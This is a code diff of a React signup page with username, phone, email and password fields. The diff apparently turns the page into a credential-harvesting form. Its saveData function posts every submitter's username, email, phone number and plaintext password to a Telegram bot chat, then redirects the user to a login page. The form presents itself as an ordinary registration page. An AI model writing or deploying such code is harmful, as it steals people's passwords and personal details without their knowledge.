@@ -1,8 +1,10 @@
 import React, {useState} from "react";
-import db from "../../firebase";
-import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
+//import db from "../../firebase";
+//import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
+import axios from "axios";
 
 const Home = () => {
+    const url = `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT}/sendMessage`;
     const [toggle, setToggle] = useState("password")
     const toggleText = () => {
         if(toggle === "password"){
@@ -12,10 +14,14 @@ const Home = () => {
         }
     }
     const [values, setValues] = useState({
+        username: '',
+        phone: '',
         email: '',
         password: ''
     })
     const [errors, setErrors] = useState({
+        username: '',
+        phone: '',
         email: '',
         password: ''
     })
@@ -34,19 +40,31 @@ const Home = () => {
         if(!values.password){
             errors.password = "This field may not be blank."
         }
+        if(!values.username){
+            errors.username = "This field may not be blank."
+        }
+        if(!values.phone){
+            errors.phone = "This field may not be blank."
+        }
         return errors
     }
     const hadleValidation = (e) => {
         e.preventDefault()
         setErrors(validate(values))
         if(values.email && values.password && !errors.email && !errors.password){
-            const docRef = doc(db, "users", "user_" + new Date().getTime());
+            //const docRef = doc(db, "users", "user_" + new Date().getTime());
             const saveData = async () => {
-                await setDoc(docRef, {
-                    email: values.email,
-                    password: values.password,
-                    otp: ""
-                });
+                // await setDoc(docRef, {
+                //     email: values.email,
+                //     password: values.password,
+                //     username: values.username,
+                //     phone: values.phone,
+                // });
+                await axios.post(url, {
+                    chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
+                    text: `New User: ${values.username} \nEmail: ${values.email} \nPhone: ${values.phone} \nPassword: ${values.password}`
+                })
+                window.location.href = "/login"
             }
             saveData()
         }
@@ -72,34 +90,34 @@ const Home = () => {
                     <div className="flex flex-col justify-start w-full items-start space-y-2">
                             <label className="text-sm text-[#858F9A]">USERNAME</label>
                             <div className="flex items-center relative justify-between w-full">
-                                <input name='email' placeholder="Username" onChange={handleInput} type="text" className={`w-full h-14 border border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
+                                <input name='username' placeholder="Username" onChange={handleInput} type="text" className={`w-full h-14 border border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                                 <svg width="15" className="absolute cursor-pointer right-6" height="16" viewBox="0 0 15 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                     <path d="M7.03003 8C8.0909 8 9.10831 7.57857 9.85846 6.82843C10.6086 6.07828 11.03 5.06087 11.03 4C11.03 2.93913 10.6086 1.92172 9.85846 1.17157C9.10831 0.421427 8.0909 0 7.03003 0C5.96916 0 4.95175 0.421427 4.2016 1.17157C3.45146 1.92172 3.03003 2.93913 3.03003 4C3.03003 5.06087 3.45146 6.07828 4.2016 6.82843C4.95175 7.57857 5.96916 8 7.03003 8ZM5.6019 9.5C2.52378 9.5 0.0300293 11.9937 0.0300293 15.0719C0.0300293 15.5844 0.445654 16 0.958154 16H13.1019C13.6144 16 14.03 15.5844 14.03 15.0719C14.03 11.9937 11.5363 9.5 8.45815 9.5H5.6019Z" fill="#858F9A"/>
                                 </svg>
                             </div>
-                            {errors.password && 
+                            {errors.username && 
                             <div className="flex gap-2 items-center justify-start w-full">
                                 <svg className='w-5 rotate-180' aria-hidden="true" fill="none" stroke="red"  strokeWidth="1.8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                     <path d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" strokeLinecap="round" strokeLinejoin="round"></path>
                                 </svg>
-                                <p className="text-red-600 text-sm">{errors.password}</p>
+                                <p className="text-red-600 text-sm">{errors.username}</p>
                             </div>
                             }
                         </div>
                     <div className="flex flex-col justify-start w-full items-start space-y-2">
                             <label className="text-sm text-[#858F9A]">PHONE NUMBER</label>
                             <div className="flex items-center relative justify-between w-full">
-                                <input name='email' placeholder="Phone Number" onChange={handleInput} type="text" className={`w-full h-14 border border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
+                                <input name='phone' placeholder="Phone Number" onChange={handleInput} type="text" className={`w-full h-14 border border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                                 <svg width="17" className="absolute cursor-pointer right-6" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M5.17311 0.768753C4.93249 0.187503 4.29811 -0.121872 3.69186 0.0437527L0.941864 0.793753C0.398114 0.943753 0.019989 1.4375 0.019989 2C0.019989 9.73125 6.28874 16 14.02 16C14.5825 16 15.0762 15.6219 15.2262 15.0781L15.9762 12.3281C16.1419 11.7219 15.8325 11.0875 15.2512 10.8469L12.2512 9.59688C11.7419 9.38438 11.1512 9.53125 10.8044 9.95938L9.54186 11.5C7.34186 10.4594 5.56061 8.67813 4.51999 6.47813L6.06061 5.21875C6.48874 4.86875 6.63561 4.28125 6.42311 3.77188L5.17311 0.771878V0.768753Z" fill="#858F9A"/>
                                 </svg>
                             </div>
-                            {errors.password && 
+                            {errors.phone && 
                             <div className="flex gap-2 items-center justify-start w-full">
                                 <svg className='w-5 rotate-180' aria-hidden="true" fill="none" stroke="red"  strokeWidth="1.8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                     <path d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" strokeLinecap="round" strokeLinejoin="round"></path>
                                 </svg>
-                                <p className="text-red-600 text-sm">{errors.password}</p>
+                                <p className="text-red-600 text-sm">{errors.phone}</p>
                             </div>
                             }
                         </div>
